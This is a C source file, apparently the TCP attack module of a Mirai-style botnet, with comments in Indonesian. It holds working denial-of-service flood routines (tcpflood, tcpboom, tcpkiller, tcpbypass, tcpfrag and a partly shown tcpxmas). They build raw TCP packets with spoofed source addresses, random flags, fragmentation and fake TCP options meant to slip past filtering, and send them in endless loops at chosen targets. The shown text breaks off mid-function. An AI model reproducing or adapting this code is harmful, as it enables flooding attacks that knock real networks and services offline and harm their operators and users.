#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <fcntl.h>
#include <errno.h>
#include <linux/if_ether.h>
#include <string.h>
#include <sys/uio.h>
#include <time.h>
#include <pthread.h>

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/checksum.h"
#include "headers/rand.h"

#ifndef TH_FIN
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#endif

enum XMAS_PROFILE
{
    PROFILE_XMAS,
    PROFILE_NULL,
    PROFILE_FIN
};

// ==================== OPTIMASI SUPER RINGAN ====================
// Precomputed random pool (8MB biar variasi gila)
static unsigned char random_pool[8388608];
static int pool_initialized = 0;
static uint32_t pool_index = 0;

// Random flag table
static uint8_t flag_combinations[] = {
    TH_SYN,                                    // SYN
    TH_ACK,                                    // ACK
    TH_SYN | TH_ACK,                          // SYN+ACK
    TH_RST,                                    // RST
    TH_FIN,                                    // FIN
    TH_PUSH,                                   // PUSH
    TH_URG,                                    // URG
    TH_SYN | TH_ACK | TH_PUSH,                // SYN+ACK+PUSH
    TH_FIN | TH_ACK,                          // FIN+ACK
    TH_RST | TH_ACK,                          // RST+ACK
    TH_SYN | TH_FIN,                          // SYN+FIN (weird)
    TH_URG | TH_PUSH | TH_FIN,                // URG+PUSH+FIN (XMAS)
    0,                                         // NULL flag
};

#define FLAG_COUNT (sizeof(flag_combinations) / sizeof(flag_combinations[0]))

// Fast LCG random (super cepat)
static uint32_t fast_rand_state = 0x12345678;

static inline uint32_t fast_rand(void) {
    fast_rand_state = fast_rand_state * 1103515245 + 12345;
    return (fast_rand_state >> 16) & 0x7FFF;
}

static inline uint16_t fast_rand_port(void) {
    fast_rand_state = fast_rand_state * 1103515245 + 12345;
    return 1024 + (fast_rand_state % 64512);
}

static inline uint32_t fast_rand_next(void) {
    fast_rand_state = fast_rand_state * 1103515245 + 12345;
    return fast_rand_state;
}

static inline uint32_t fast_rand_range(uint32_t min, uint32_t max) {
    fast_rand_state = fast_rand_state * 1103515245 + 12345;
    return min + (fast_rand_state % (max - min + 1));
}

static inline uint8_t fast_rand_flag(void) {
    return flag_combinations[fast_rand() % FLAG_COUNT];
}

static inline void init_random_pool(void) {
    if (pool_initialized) return;
    printf("[*] Generating TCP random pool 8MB...\n");
    for (int i = 0; i < sizeof(random_pool); i++) {
        random_pool[i] = fast_rand() & 0xFF;
    }
    pool_initialized = 1;
    printf("[*] TCP random pool ready\n");
}

// ==================== TCP FLOOD (RANDOM FLAG + RANDOM PAYLOAD) ====================
void attack_tcpflood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 255);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    init_random_pool();

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        return;

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int));

    for (i = 0; i < targs_len; i++)
    {
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        struct iphdr *iph = (struct iphdr *)pkts[i];
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        char *payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph->frag_off = 0;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        iph->ttl = ip_ttl;

        tcph->dest = htons(dport == 0xffff ? fast_rand_port() : dport);
        tcph->doff = 5;
        
        // RANDOM FLAGS
        uint8_t flags = fast_rand_flag();
        tcph->syn = (flags & TH_SYN) ? 1 : 0;
        tcph->ack = (flags & TH_ACK) ? 1 : 0;
        tcph->rst = (flags & TH_RST) ? 1 : 0;
        tcph->fin = (flags & TH_FIN) ? 1 : 0;
        tcph->psh = (flags & TH_PUSH) ? 1 : 0;
        tcph->urg = (flags & TH_URG) ? 1 : 0;
        
        tcph->window = htons(fast_rand_range(1024, 65535));
        
        if (data_rand && data_len > 0) {
            fast_rand_str(payload, data_len);
        }
    }

    int loop_counter = 0;
    int random_rotate = 0;
    
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *payload = (char *)(tcph + 1);

            iph->id = htons(ip_ident ? ip_ident : fast_rand() & 0xFFFF);
            tcph->source = htons(sport == 0xffff ? fast_rand_port() : sport);
            tcph->seq = htonl(fast_rand_next());
            tcph->ack_seq = htonl(fast_rand_next());
            
            // RANDOM FLAGS setiap paket
            uint8_t flags = fast_rand_flag();
            tcph->syn = (flags & TH_SYN) ? 1 : 0;
            tcph->ack = (flags & TH_ACK) ? 1 : 0;
            tcph->rst = (flags & TH_RST) ? 1 : 0;
            tcph->fin = (flags & TH_FIN) ? 1 : 0;
            tcph->psh = (flags & TH_PUSH) ? 1 : 0;
            tcph->urg = (flags & TH_URG) ? 1 : 0;
            
            // RANDOM PAYLOAD setiap 100 paket
            if (data_rand && data_len > 0 && (++random_rotate % 100 == 0)) {
                fast_rand_str(payload, data_len);
            }

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr) + data_len, sizeof(struct tcphdr));

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, 
                   MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, 
                   sizeof(struct sockaddr_in));
        }
        
        if (++loop_counter >= 500) {
            sched_yield();
            loop_counter = 0;
        }
    }

    close(fd);
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
}

// ==================== TCP BOOM (DENGAN TCP OPTIONS) ====================
void attack_tcpboom(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);

    init_random_pool();

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int));

    for (i = 0; i < targs_len; i++)
    {
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len + 20);
        struct iphdr *iph = (struct iphdr *)pkts[i];
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        char *payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);

        tcph->source = htons(sport == 0xffff ? fast_rand_port() : sport);
        tcph->dest = htons(dport == 0xffff ? fast_rand_port() : dport);
        tcph->seq = htonl(fast_rand_next());
        tcph->ack_seq = htonl(fast_rand_next());
        tcph->doff = 5;
        
        uint8_t flags = fast_rand_flag();
        tcph->syn = (flags & TH_SYN) ? 1 : 0;
        tcph->ack = (flags & TH_ACK) ? 1 : 0;
        tcph->rst = (flags & TH_RST) ? 1 : 0;
        tcph->fin = (flags & TH_FIN) ? 1 : 0;
        tcph->psh = (flags & TH_PUSH) ? 1 : 0;
        tcph->urg = (flags & TH_URG) ? 1 : 0;
        
        tcph->window = htons(2048 + (fast_rand() % 4096));

        // TCP Options (biar lebih legit)
        uint8_t *tcp_options = (uint8_t *)(tcph + 1);
        tcp_options[0] = 0x02;  // MSS option
        tcp_options[1] = 0x04;
        *(uint16_t *)&tcp_options[2] = htons(1460);
        tcp_options[4] = 0x01;  // NOP
        tcp_options[5] = 0x03;  // Window scale
        tcp_options[6] = 0x03;
        tcp_options[7] = 0x06;  // SACK permitted
        tcp_options[8] = 0x01;
        tcp_options[9] = 0x01;  // NOP
        tcp_options[10] = 0x08; // Timestamp
        tcp_options[11] = 0x0a;
        *(uint32_t *)&tcp_options[12] = htonl(fast_rand_next());
        *(uint32_t *)&tcp_options[16] = 0;
        
        tcph->doff = 8;  // Header length with options

        if (data_rand && data_len > 0)
        {
            fast_rand_str(payload, data_len);
        }
    }

    int loop_counter = 0;
    int random_rotate = 0;
    
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *payload = (char *)(tcph + 1);
            
            if (targs[i].netmask < 32)
            {
                iph->daddr = htonl(ntohl(targs[i].addr) + (fast_rand() >> targs[i].netmask));
            }

            if (source_ip == 0xffffffff)
            {
                iph->saddr = fast_rand_next();
            }

            if (sport == 0xffff)
            {
                tcph->source = htons(1024 + (fast_rand() % 64512));
            }
            if (dport == 0xffff)
            {
                tcph->dest = htons(fast_rand() % 65535);
            }

            tcph->seq = htonl(fast_rand_next());
            tcph->ack_seq = htonl(fast_rand_next());
            
            uint8_t flags = fast_rand_flag();
            tcph->syn = (flags & TH_SYN) ? 1 : 0;
            tcph->ack = (flags & TH_ACK) ? 1 : 0;
            tcph->rst = (flags & TH_RST) ? 1 : 0;
            tcph->fin = (flags & TH_FIN) ? 1 : 0;
            tcph->psh = (flags & TH_PUSH) ? 1 : 0;
            tcph->urg = (flags & TH_URG) ? 1 : 0;

            if (data_rand && data_len > 0 && (++random_rotate % 100 == 0)) {
                fast_rand_str(payload, data_len);
            }

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr) + data_len + 20, sizeof(struct tcphdr) + 20);

            int ttl = 32 + (fast_rand() % 32);
            setsockopt(fd, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len + 20, MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        
        if (++loop_counter >= 400) {
            sched_yield();
            loop_counter = 0;
        }
    }

    close(fd);
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
}

// ==================== TCP KILLER (RANDOM FLAG + RANDOM PAYLOAD) ====================
void attack_tcpkiller(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    init_random_pool();

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        return;
    }

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int));

    for (i = 0; i < targs_len; i++)
    {
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        struct iphdr *iph = (struct iphdr *)pkts[i];
        struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
        char *payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph->id = htons(fast_rand() & 0xffff);
        iph->ttl = 32 + (fast_rand() % 96);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);

        tcph->source = htons(sport == 0xffff ? fast_rand_port() : sport);
        tcph->dest = htons(dport == 0xffff ? fast_rand_port() : dport);
        tcph->seq = htonl(fast_rand_next());
        tcph->ack_seq = htonl(fast_rand_next());
        tcph->doff = 5;
        
        uint8_t flags = fast_rand_flag();
        tcph->syn = (flags & TH_SYN) ? 1 : 0;
        tcph->ack = (flags & TH_ACK) ? 1 : 0;
        tcph->rst = (flags & TH_RST) ? 1 : 0;
        tcph->fin = (flags & TH_FIN) ? 1 : 0;
        tcph->psh = (flags & TH_PUSH) ? 1 : 0;
        tcph->urg = (flags & TH_URG) ? 1 : 0;
        
        tcph->window = htons(256 + (fast_rand() % 8192));

        if (data_rand && data_len > 0)
        {
            fast_rand_str(payload, data_len);
        }
    }

    int loop_counter = 0;
    int random_rotate = 0;
    
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *payload = (char *)(tcph + 1);

            if (targs[i].netmask < 32)
            {
                iph->daddr = htonl(ntohl(targs[i].addr) + (fast_rand() >> targs[i].netmask));
            }

            if (source_ip == 0xffffffff)
            {
                iph->saddr = fast_rand_next();
            }
            
            uint8_t flags = fast_rand_flag();
            tcph->syn = (flags & TH_SYN) ? 1 : 0;
            tcph->ack = (flags & TH_ACK) ? 1 : 0;
            tcph->rst = (flags & TH_RST) ? 1 : 0;
            tcph->fin = (flags & TH_FIN) ? 1 : 0;
            tcph->psh = (flags & TH_PUSH) ? 1 : 0;
            tcph->urg = (flags & TH_URG) ? 1 : 0;
            
            if (data_rand && data_len > 0 && (++random_rotate % 100 == 0)) {
                fast_rand_str(payload, data_len);
            }

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr) + data_len, sizeof(struct tcphdr));

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, MSG_NOSIGNAL,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        
        if (++loop_counter >= 500) {
            sched_yield();
            loop_counter = 0;
        }
    }

    close(fd);
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
}

// ==================== TCP BYPASS (RANDOM FLAG + RANDOM PAYLOAD) ====================
void attack_tcpbypass(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 64);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    init_random_pool();

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0)
        return;

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;

        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;
        if (dont_frag)
            iph->frag_off = htons(1 << 14);

        tcph->source = htons((sport == 0xffff) ? (1024 + (fast_rand() % 64511)) : sport);
        tcph->dest = htons((dport == 0xffff) ? (fast_rand() % 65535) : dport);

        // RANDOM FLAGS
        uint8_t flags = fast_rand_flag();
        tcph->urg = (flags & TH_URG) ? 1 : 0;
        tcph->ack = (flags & TH_ACK) ? 1 : 0;
        tcph->psh = (flags & TH_PUSH) ? 1 : 0;
        tcph->fin = (flags & TH_FIN) ? 1 : 0;
        tcph->rst = (flags & TH_RST) ? 1 : 0;
        tcph->syn = (flags & TH_SYN) ? 1 : 0;
        
        tcph->doff = 5;
        tcph->window = htons(1024 + (fast_rand() % 4096));

        tcph->seq = htonl(fast_rand_next());
        tcph->ack_seq = htonl(fast_rand_next());

        if (data_rand)
            fast_rand_str(payload, data_len);
    }

    int loop_counter = 0;
    int random_rotate = 0;
    
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *payload = (char *)(tcph + 1);

            iph->id = htons(fast_rand() & 0xffff);
            iph->ttl = 32 + (fast_rand() % 64);
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
            
            tcph->seq = htonl(fast_rand_next());
            tcph->ack_seq = htonl(fast_rand_next());

            // RANDOM FLAGS setiap paket
            uint8_t flags = fast_rand_flag();
            tcph->urg = (flags & TH_URG) ? 1 : 0;
            tcph->ack = (flags & TH_ACK) ? 1 : 0;
            tcph->psh = (flags & TH_PUSH) ? 1 : 0;
            tcph->fin = (flags & TH_FIN) ? 1 : 0;
            tcph->rst = (flags & TH_RST) ? 1 : 0;
            tcph->syn = (flags & TH_SYN) ? 1 : 0;
            
            if (data_rand && (++random_rotate % 100 == 0)) {
                fast_rand_str(payload, data_len);
            }
            
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, sizeof(struct tcphdr) + data_len, sizeof(struct tcphdr) + data_len);

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len, 0,
                   (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        
        if (++loop_counter >= 400) {
            sched_yield();
            loop_counter = 0;
        }
    }

    close(fd);
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
}

// ==================== TCP FRAG (RANDOM FLAG + FRAGMENTASI) ====================
void attack_tcpfrag(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 0);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int frag_size = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_FRAG_SIZE, 32);

    init_random_pool();

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        return;

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(int));

    int loop_counter = 0;
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
            char *packet = calloc(1, total_len);
            struct iphdr *iph = (struct iphdr *)packet;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *payload = (char *)(tcph + 1);

            iph->version = 4;
            iph->ihl = 5;
            iph->tos = ip_tos;
            iph->tot_len = htons(total_len);
            iph->id = htons(ip_ident == 0xffff ? fast_rand() & 0xffff : ip_ident);
            iph->ttl = ip_ttl;
            iph->protocol = IPPROTO_TCP;
            iph->saddr = source_ip == 0xffffffff ? fast_rand_next() : source_ip;
            iph->daddr = targs[i].addr;
            if (dont_frag)
                iph->frag_off = htons(1 << 14);

            tcph->source = htons(sport == 0xffff ? fast_rand_port() : sport);
            tcph->dest = htons(dport == 0xffff ? fast_rand_port() : dport);
            tcph->seq = htonl(fast_rand_next());
            tcph->ack_seq = htonl(fast_rand_next());
            tcph->doff = 5;

            uint8_t flags = fast_rand_flag();
            tcph->syn = (flags & TH_SYN) ? 1 : 0;
            tcph->ack = (flags & TH_ACK) ? 1 : 0;
            tcph->rst = (flags & TH_RST) ? 1 : 0;
            tcph->fin = (flags & TH_FIN) ? 1 : 0;
            tcph->psh = (flags & TH_PUSH) ? 1 : 0;
            tcph->urg = (flags & TH_URG) ? 1 : 0;
            
            tcph->window = htons(256 + (fast_rand() % 8192));

            if (data_rand && data_len > 0)
            {
                fast_rand_str(payload, data_len);
            }

            int offset = 0;
            while (offset < total_len - sizeof(struct iphdr))
            {
                int remaining = total_len - sizeof(struct iphdr) - offset;
                int frag_payload_size = remaining > frag_size ? frag_size : remaining;
                int frag_total_size = sizeof(struct iphdr) + frag_payload_size;

                char *frag_pkt = calloc(1, frag_total_size);
                struct iphdr *frag_iph = (struct iphdr *)frag_pkt;

                memcpy(frag_pkt, packet, sizeof(struct iphdr));
                memcpy(frag_pkt + sizeof(struct iphdr), packet + sizeof(struct iphdr) + offset, frag_payload_size);

                frag_iph->tot_len = htons(frag_total_size);

                uint16_t frag_off = (offset / 8);
                if ((offset + frag_payload_size) < (total_len - sizeof(struct iphdr)))
                    frag_off |= htons(1 << 13);

                frag_iph->frag_off = frag_off;
                frag_iph->check = 0;
                frag_iph->check = checksum_generic((uint16_t *)frag_iph, sizeof(struct iphdr));

                sendto(fd, frag_pkt, frag_total_size, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));

                free(frag_pkt);
                offset += frag_payload_size;
            }

            free(packet);
        }
        
        if (++loop_counter >= 400) {
            sched_yield();
            loop_counter = 0;
        }
    }

    close(fd);
}

// ==================== TCP XMAS (XMAS + NULL + FIN SCAN) ====================
void attack_tcpxmas(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, rfd;
    struct attack_xmas_data *xmas_data = calloc(targs_len, sizeof(struct attack_xmas_data));
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 768);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint8_t profile = attack_get_opt_int(opts_len, opts, ATK_OPT_CUSTOM + 1, PROFILE_XMAS);

    init_random_pool();

    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
        return;

    i = 1;
    setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int));

    for (i = 0; i < targs_len; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;

    xmas_setup_nums:
        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
            continue;
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = (targs[i].netmask < 32)
                                   ? htonl(ntohl(targs[i].addr) + (((uint32_t)fast_rand()) >> targs[i].netmask))
                                   : targs[i].addr;
        addr.sin_port = (dport == 0xffff) ? htons(fast_rand() % 65535) : htons(dport);

        connect(fd, (struct sockaddr *)&addr, sizeof(addr));
        start_recv = time(NULL);

        while (TRUE)
        {
            int ret;
            recv_addr_len = sizeof(recv_addr);
            ret = recvfrom(rfd, pktbuf, sizeof(pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
                return;

            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr &&
                ret > (sizeof(struct iphdr) + sizeof(struct tcphdr)))
            {
                struct tcphdr *tcph_recv = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));
                if (tcph_recv->source == addr.sin_port && tcph_recv->syn && tcph_recv->ack)
                {
                    struct iphdr *iph;
                    struct tcphdr *tcph;
                    char *payload;
                    xmas_data[i].addr = addr.sin_addr.s_addr;
                    xmas_data[i].seq = ntohl(tcph_recv->seq);
                    xmas_data[i].ack_seq = ntohl(tcph_recv->ack_seq);
                    xmas_data[i].sport = tcph_recv->dest;
                    xmas_data[i].dport = addr.sin_port;

                    pkts[i] = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
                    iph = (struct iphdr *)pkts[i];
                    tcph = (struct tcphdr *)(iph + 1);
                    payload = (char *)(tcph + 1);

                    iph->version = 4;
                    iph->ihl = 5;
                    iph->tos = ip_tos;
                    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len);
                    iph->id = htons(ip_ident);
                    iph->ttl = ip_ttl;
                    if (dont_frag)
                        iph->frag_off = htons(1 << 14);
                    iph->protocol = IPPROTO_TCP;
                    iph->saddr = LOCAL_ADDR;
                    iph->daddr = xmas_data[i].addr;

                    tcph->source = xmas_data[i].sport;
                    tcph->dest = xmas_data[i].dport;
                    tcph->seq = htonl(xmas_data[i].ack_seq);
                    tcph->ack_seq = htonl(xmas_data[i].seq);
                    tcph->doff = 5;

                    // XMAS / NULL / FIN profile
                    tcph->urg = tcph->psh = tcph->fin = tcph->ack = tcph->rst = tcph->syn = 0;
                    switch (profile)
                    {
                    case PROFILE_XMAS:
                        tcph->urg = 1;
                        tcph->psh = 1;
                        tcph->fin = 1;
                        break;
                    case PROFILE_NULL:
                        break;
                    case PROFILE_FIN:
                        tcph->fin = 1;
                        break;
                    default:
                        tcph->urg = 1;
                        tcph->psh = 1;
                        tcph->fin = 1;
                        break;
                    }

                    tcph->window = fast_rand() & 0xffff;
                    if (data_rand)
                        fast_rand_str(payload, data_len);
                    break;
                }
